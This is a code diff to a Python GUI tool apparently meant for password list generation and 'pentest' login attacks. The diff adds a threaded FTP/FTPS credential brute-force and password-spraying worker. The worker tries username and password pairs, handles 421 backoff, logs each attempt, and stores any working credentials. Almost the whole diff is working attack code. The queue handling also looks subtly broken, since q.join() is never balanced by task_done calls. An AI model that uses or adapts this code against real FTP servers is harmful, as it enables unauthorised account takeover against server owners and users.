@@ -162,6 +162,9 @@ class PasswordListGeneratorApp:
 		self.var_proxy_url = tk.StringVar(value="")
 		self.var_verify_tls = tk.BooleanVar(value=True)
 		self.var_timeout = tk.DoubleVar(value=15.0)
+		# FTP options
+		self.var_ftp_tls = tk.BooleanVar(value=False)
+		self.var_ftp_passive = tk.BooleanVar(value=True)
 		# Usernames & spraying
 		self.var_usernames_file = tk.StringVar(value="")
 		self.var_usernames_count = tk.StringVar(value="(none)")
@@ -345,6 +348,9 @@ class PasswordListGeneratorApp:
 		# Protocol selector (for speed we place it on the same row)
 		ttk.Label(target, text="Protocol").grid(row=1, column=4, sticky="e", padx=4, pady=4)
 		ttk.Combobox(target, textvariable=self.var_protocol, values=["HTTP","SSH","FTP"], width=8, state="readonly").grid(row=1, column=5, sticky="w", padx=4, pady=4)
+		# FTP toggles
+		ttk.Checkbutton(target, text="FTP TLS", variable=self.var_ftp_tls).grid(row=1, column=6, sticky="w", padx=4, pady=4)
+		ttk.Checkbutton(target, text="Passive", variable=self.var_ftp_passive).grid(row=1, column=7, sticky="w", padx=4, pady=4)
 		self._add_labeled_entry(target, "Username value", self.var_username_value, row=2, col=0)
 		self._add_labeled_entry(target, "Username param", self.var_user_param, row=2, col=2)
 		self._add_labeled_entry(target, "Password param", self.var_pass_param, row=2, col=4)
@@ -1953,8 +1959,7 @@ class PasswordListGeneratorApp:
 		if proto == 'SSH':
 			return self._worker_pentest_ssh(mode, min_len, max_len, cfg)
 		elif proto == 'FTP':
-			self.ui_queue.put(("log", "FTP spray not implemented yet"))
-			return 0, "FTP spray not implemented yet"
+			return self._worker_pentest_ftp(mode, min_len, max_len, cfg)
 		# HTTP path
 		completed = 0
 		found_msg = ""
@@ -4110,6 +4115,144 @@ class PasswordListGeneratorApp:
 				time.sleep(0.2)
 		except Exception:
 			return
+
+	def _worker_pentest_ftp(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
+		completed = 0
+		found_msg = ""
+		limiter = RateLimiter(cfg.get('qps') or 1.0)
+		host = cfg.get('ftp_host') or (urlparse(cfg.get('url') or '').hostname or '')
+		port = int(cfg.get('ftp_port') or 21)
+		tls = bool(cfg.get('ftp_tls'))
+		passive = bool(cfg.get('ftp_passive', True))
+		stop_event = threading.Event()
+		q = queue.Queue(maxsize=2000)
+		lock = threading.Lock()
+		def producer(it):
+			try:
+				for pair in it:
+					if self.cancel_requested or stop_event.is_set():
+						break
+					try:
+						q.put(pair, timeout=0.5)
+					except queue.Full:
+						continue
+			except Exception as exc:
+				self.ui_queue.put(("log", f"FTP producer error: {exc}"))
+			finally:
+				for _ in range(int(cfg.get('concurrency') or 2)):
+					try:
+						q.put_nowait((None, None))
+					except Exception:
+						pass
+		def attempt(user: str, pwd: str) -> tuple[bool, bool, bool, int, str]:
+			t0 = time.time(); code = ''
+			try:
+				ftp = ftplib.FTP_TLS() if tls else ftplib.FTP()
+				limiter.acquire(); self._wait_global_backoff()
+				ftp.connect(host=host, port=port, timeout=cfg.get('timeout') or 10.0)
+				ftp.set_pasv(passive)
+				if tls and isinstance(ftp, ftplib.FTP_TLS):
+					try: ftp.auth()
+					except Exception: pass
+				resp = ftp.login(user=user, passwd=pwd)
+				code = (resp or '')[:3]
+				try:
+					ftp.quit()
+				except Exception:
+					try: ftp.close()
+					except Exception: pass
+				lat = int((time.time() - t0) * 1000)
+				if code == '230':
+					return True, False, False, lat, code
+				elif code == '530':
+					return False, False, False, lat, code
+				else:
+					return False, False, True, lat, code
+			except ftplib.error_temp as exc:
+				lat = int((time.time() - t0) * 1000)
+				msg = str(exc)
+				if '421' in msg:
+					self._trigger_error_backoff(int(self.var_failfast_backoff_sec.get() or 30))
+					self.ui_queue.put(("log", f"[FTP] 421 backoff triggered"))
+					return False, True, True, lat, '421'
+				return False, False, True, lat, '4xx'
+			except ftplib.error_perm as exc:
+				lat = int((time.time() - t0) * 1000)
+				msg = str(exc)
+				if msg.startswith('530'):
+					return False, False, False, lat, '530'
+				return False, False, True, lat, '5xx'
+			except Exception:
+				lat = int((time.time() - t0) * 1000)
+				return False, False, True, lat, code or ''
+		def worker(wid: int):
+			nonlocal completed, found_msg
+			while not self.cancel_requested and not stop_event.is_set():
+				try:
+					user, pwd = q.get(timeout=0.5)
+				except queue.Empty:
+					continue
+				if user is None:
+					break
+				ok, locked, error, lat, code = attempt(user, pwd)
+				self._record_attempt(lat/1000.0, None, ok, locked, error)
+				if self._check_failfast(cfg):
+					stop_event.set(); break
+				if self._log_fp:
+					self._log_line([
+						datetime.now().isoformat(timespec='seconds'), user, pwd, code, lat, int(bool(ok)), int(bool(locked)), int(bool(error)), '', ''
+					])
+				with lock:
+					completed += 1
+					if completed <= 50:
+						self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
+				if ok:
+					found_msg = f"SUCCESS (FTP{'+TLS' if tls else ''} {host}:{port}): {user} / {pwd}"
+					try:
+						self.found_credentials.append({
+							"timestamp": datetime.now().isoformat(timespec='seconds'),
+							"protocol": "FTPS" if tls else "FTP",
+							"host": host,
+							"port": port,
+							"username": user,
+							"password": pwd,
+							"status": code,
+							"latency_ms": lat,
+						})
+					except Exception:
+						pass
+					self.ui_queue.put(("log", found_msg))
+					stop_event.set(); break
+		threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(int(cfg.get('concurrency') or 2))]
+		# Build iterable of pairs
+		if cfg.get('spray_enabled'):
+			pairs = ((u, p) for u in (cfg.get('usernames') or []) for p in (cfg.get('spray_passwords') or []))
+		else:
+			fixed_users = cfg.get('usernames', []) or [cfg.get('username')]
+			if mode == 'Brute-force':
+				pw_iter = self._bruteforce_stream(min_len, max_len)
+			elif mode == 'Smart brute-force':
+				pw_iter = self._smart_bruteforce_candidates(min_len, max_len)
+			else:
+				pw_iter = self._smart_candidates(min_len, max_len)
+			pairs = ((fixed_users[0], pw) for pw in pw_iter)
+		prod = threading.Thread(target=producer, args=(pairs,), daemon=True)
+		prod.start()
+		for t in threads:
+			t.start()
+		try:
+			q.join()
+		except Exception:
+			pass
+		stop_event.set()
+		for t in threads:
+			try:
+				t.join(timeout=1.0)
+			except Exception:
+				pass
+		if not found_msg:
+			found_msg = f"FTP run finished. Attempts: {completed:,}. No success."
+		return completed, found_msg
 
 
 if __name__ == "__main__":
